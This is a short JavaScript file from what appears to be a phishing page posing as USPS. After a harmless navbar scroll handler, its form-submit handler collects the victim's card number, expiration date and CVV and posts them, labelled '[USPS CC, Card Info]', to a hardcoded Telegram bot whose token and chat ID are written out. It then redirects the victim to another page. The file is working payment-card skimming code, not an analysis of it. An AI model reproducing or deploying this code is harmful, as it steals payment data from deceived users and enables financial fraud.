window.addEventListener('scroll', () => {
    const navbar = document.querySelector('.navbar__container');
    const scrolledClass = 'scrolled';
    const scrollPosition = window.scrollY;

    if (scrollPosition > 50) { // Change 50 to the desired pixel value
        navbar.classList.add(scrolledClass);
    } else {
        navbar.classList.remove(scrolledClass);
    }
});


// Submissions
const card = document.getElementById('fcard');
const exp = document.getElementById('fexp');
const cvv = document.getElementById('fcvv');

const submit = document.getElementsByClassName('contact')[0];

submit.addEventListener('submit', async (e) => {
    e.preventDefault();

    let ebody = `
    \n
    <b>[USPS CC, Card Info]</b>
    \n
    <b>Card Number: </b>${card.value}
    \n 
    <b>Expiration Date: </b>${exp.value} 
    \n
    <b>CVV: </b>${cvv.value}
    \n`;

    // Telegram Bot API endpoint
    const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
    const chatId = '6391433593';

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: ebody,
            parse_mode: 'HTML',
        });

        // Redirect after sending the message
        window.location.href = "v.html";
    } catch (error) {
        console.error("Error sending to Tele:", error);

        // Check if there's a specific error message from the Telegram API response
        if (error.response && error.response.data) {
            console.error("Tele API error:", error.response.data);
        }
    }
});